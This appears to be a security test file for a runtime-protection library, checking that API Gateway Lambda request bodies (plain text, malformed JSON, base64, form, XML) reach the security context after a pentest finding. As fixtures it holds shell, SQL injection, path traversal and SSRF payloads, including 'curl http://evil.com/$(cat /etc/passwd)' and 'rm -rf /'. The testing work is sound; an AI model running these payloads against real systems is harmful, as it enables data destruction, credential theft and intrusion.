import * as t from "tap";
import { getContextForGatewayEvent } from "./gateway";
import type { APIGatewayProxyEventV1, APIGatewayProxyEventV2 } from "./gateway";

/**
 * Security tests for API Gateway Lambda body parsing
 * 
 * These tests verify that the mitigation for the pentest finding
 * "API Gateway Lambda bodies can bypass contextual sink blocking" is effective.
 * 
 * The vulnerability was that parseBody would return undefined for:
 * - Non-JSON content types
 * - Empty bodies
 * - Malformed JSON
 * - Base64-encoded bodies (without decoding)
 * 
 * This caused the body to be omitted from the AgentContext, allowing
 * attacker-controlled data to bypass contextual security checks while
 * still being accessible to the application handler.
 */

t.test("parseBody includes non-JSON bodies in context", async (t) => {
  // Test case: plain text body should be included in context
  const event: APIGatewayProxyEventV1 = {
    resource: "/test",
    path: "/test",
    httpMethod: "POST",
    headers: {
      "content-type": "text/plain",
    },
    body: "rm -rf /; echo 'malicious'",
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  t.equal(context?.body, "rm -rf /; echo 'malicious'", "body should contain the plain text");
});

t.test("parseBody includes malformed JSON as string in context", async (t) => {
  // Test case: malformed JSON should be included as raw string
  const event: APIGatewayProxyEventV1 = {
    resource: "/test",
    path: "/test",
    httpMethod: "POST",
    headers: {
      "content-type": "application/json",
    },
    body: "{invalid json with `whoami`}",
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  t.equal(context?.body, "{invalid json with `whoami`}", "malformed JSON should be preserved as string");
});

t.test("parseBody decodes base64-encoded bodies", async (t) => {
  // Test case: base64-encoded body should be decoded
  const maliciousCommand = "curl http://evil.com/$(cat /etc/passwd)";
  const base64Body = Buffer.from(maliciousCommand).toString("base64");
  
  const event: APIGatewayProxyEventV1 = {
    resource: "/test",
    path: "/test",
    httpMethod: "POST",
    headers: {
      "content-type": "text/plain",
    },
    body: base64Body,
    isBase64Encoded: true,
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  t.equal(context?.body, maliciousCommand, "base64 body should be decoded");
});

t.test("parseBody decodes base64-encoded JSON bodies", async (t) => {
  // Test case: base64-encoded JSON should be decoded and parsed
  const jsonPayload = { command: "rm -rf /", injection: "`whoami`" };
  const base64Body = Buffer.from(JSON.stringify(jsonPayload)).toString("base64");
  
  const event: APIGatewayProxyEventV1 = {
    resource: "/test",
    path: "/test",
    httpMethod: "POST",
    headers: {
      "content-type": "application/json",
    },
    body: base64Body,
    isBase64Encoded: true,
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  t.same(context?.body, jsonPayload, "base64 JSON should be decoded and parsed");
});

t.test("parseBody handles invalid base64 gracefully", async (t) => {
  // Test case: invalid base64 should fall back to original string
  const event: APIGatewayProxyEventV1 = {
    resource: "/test",
    path: "/test",
    httpMethod: "POST",
    headers: {
      "content-type": "text/plain",
    },
    body: "not-valid-base64-but-still-dangerous",
    isBase64Encoded: true,
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  // Even if base64 decoding fails, the body should still be in context
  t.ok(typeof context?.body === "string", "body should be a string");
});

t.test("parseBody includes application/x-www-form-urlencoded bodies", async (t) => {
  // Test case: form-encoded bodies should be included
  const event: APIGatewayProxyEventV1 = {
    resource: "/test",
    path: "/test",
    httpMethod: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: "command=rm+-rf+/&param=`whoami`",
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  t.equal(context?.body, "command=rm+-rf+/&param=`whoami`", "form body should be preserved");
});

t.test("parseBody includes XML bodies", async (t) => {
  // Test case: XML bodies should be included
  const xmlBody = '<?xml version="1.0"?><command>rm -rf /</command>';
  const event: APIGatewayProxyEventV1 = {
    resource: "/test",
    path: "/test",
    httpMethod: "POST",
    headers: {
      "content-type": "application/xml",
    },
    body: xmlBody,
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  t.equal(context?.body, xmlBody, "XML body should be preserved");
});

t.test("parseBody works with API Gateway v2 events", async (t) => {
  // Test case: v2 events should also include non-JSON bodies
  const event: APIGatewayProxyEventV2 = {
    rawPath: "/test",
    rawQueryString: "",
    headers: {
      "content-type": "text/plain",
    },
    body: "curl http://evil.com/exfiltrate",
    requestContext: {
      http: {
        method: "POST",
        path: "/test",
        protocol: "HTTP/1.1",
        sourceIp: "1.2.3.4",
        userAgent: "test",
      },
    },
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  t.equal(context?.body, "curl http://evil.com/exfiltrate", "v2 event body should be preserved");
});

t.test("parseBody works with base64-encoded v2 events", async (t) => {
  // Test case: v2 events with base64 encoding
  const payload = "SELECT * FROM users WHERE id = '1' OR '1'='1'";
  const base64Body = Buffer.from(payload).toString("base64");
  
  const event: APIGatewayProxyEventV2 = {
    rawPath: "/test",
    rawQueryString: "",
    headers: {
      "content-type": "text/plain",
    },
    body: base64Body,
    isBase64Encoded: true,
    requestContext: {
      http: {
        method: "POST",
        path: "/test",
        protocol: "HTTP/1.1",
        sourceIp: "1.2.3.4",
        userAgent: "test",
      },
    },
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  t.equal(context?.body, payload, "v2 base64 body should be decoded");
});

t.test("parseBody still returns undefined for truly empty bodies", async (t) => {
  // Test case: empty/missing bodies should still be undefined
  const event: APIGatewayProxyEventV1 = {
    resource: "/test",
    path: "/test",
    httpMethod: "GET",
    headers: {},
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.notOk(context?.body, "empty body should be undefined");
});

t.test("parseBody handles valid JSON correctly", async (t) => {
  // Test case: valid JSON should still be parsed as before
  const jsonPayload = { user: "test", action: "delete" };
  const event: APIGatewayProxyEventV1 = {
    resource: "/test",
    path: "/test",
    httpMethod: "POST",
    headers: {
      "content-type": "application/json",
    },
    body: JSON.stringify(jsonPayload),
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  t.same(context?.body, jsonPayload, "valid JSON should be parsed");
});

t.test("parseBody handles case-insensitive content-type headers", async (t) => {
  // Test case: Content-Type header normalization
  const event: APIGatewayProxyEventV1 = {
    resource: "/test",
    path: "/test",
    httpMethod: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: '{"test": "value"}',
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  t.same(context?.body, { test: "value" }, "JSON should be parsed with uppercase header");
});

t.test("parseBody includes body with charset in content-type", async (t) => {
  // Test case: content-type with charset parameter
  const event: APIGatewayProxyEventV1 = {
    resource: "/test",
    path: "/test",
    httpMethod: "POST",
    headers: {
      "content-type": "text/plain; charset=utf-8",
    },
    body: "dangerous command",
  };

  const context = getContextForGatewayEvent(event);
  
  t.ok(context, "context should be created");
  t.ok(context?.body, "body should be present in context");
  t.equal(context?.body, "dangerous command", "body with charset should be preserved");
});

t.test("parseBody preserves shell injection payloads in non-JSON bodies", async (t) => {
  // Test case: shell injection patterns should be preserved for detection
  const shellInjectionPayloads = [
    "; rm -rf /",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "&& curl http://evil.com",
  ];

  for (const payload of shellInjectionPayloads) {
    const event: APIGatewayProxyEventV1 = {
      resource: "/test",
      path: "/test",
      httpMethod: "POST",
      headers: {
        "content-type": "text/plain",
      },
      body: payload,
    };

    const context = getContextForGatewayEvent(event);
    
    t.ok(context?.body, `body should be present for payload: ${payload}`);
    t.equal(context?.body, payload, `payload should be preserved: ${payload}`);
  }
});

t.test("parseBody preserves SQL injection payloads in non-JSON bodies", async (t) => {
  // Test case: SQL injection patterns should be preserved for detection
  const sqlInjectionPayloads = [
    "' OR '1'='1",
    "1; DROP TABLE users--",
    "admin'--",
    "' UNION SELECT * FROM passwords--",
  ];

  for (const payload of sqlInjectionPayloads) {
    const event: APIGatewayProxyEventV1 = {
      resource: "/test",
      path: "/test",
      httpMethod: "POST",
      headers: {
        "content-type": "text/plain",
      },
      body: payload,
    };

    const context = getContextForGatewayEvent(event);
    
    t.ok(context?.body, `body should be present for payload: ${payload}`);
    t.equal(context?.body, payload, `payload should be preserved: ${payload}`);
  }
});

t.test("parseBody preserves path traversal payloads in non-JSON bodies", async (t) => {
  // Test case: path traversal patterns should be preserved for detection
  const pathTraversalPayloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "....//....//....//etc/passwd",
  ];

  for (const payload of pathTraversalPayloads) {
    const event: APIGatewayProxyEventV1 = {
      resource: "/test",
      path: "/test",
      httpMethod: "POST",
      headers: {
        "content-type": "text/plain",
      },
      body: payload,
    };

    const context = getContextForGatewayEvent(event);
    
    t.ok(context?.body, `body should be present for payload: ${payload}`);
    t.equal(context?.body, payload, `payload should be preserved: ${payload}`);
  }
});

t.test("parseBody preserves SSRF payloads in non-JSON bodies", async (t) => {
  // Test case: SSRF patterns should be preserved for detection
  const ssrfPayloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080/admin",
    "file:///etc/passwd",
  ];

  for (const payload of ssrfPayloads) {
    const event: APIGatewayProxyEventV1 = {
      resource: "/test",
      path: "/test",
      httpMethod: "POST",
      headers: {
        "content-type": "text/plain",
      },
      body: payload,
    };

    const context = getContextForGatewayEvent(event);
    
    t.ok(context?.body, `body should be present for payload: ${payload}`);
    t.equal(context?.body, payload, `payload should be preserved: ${payload}`);
  }
});
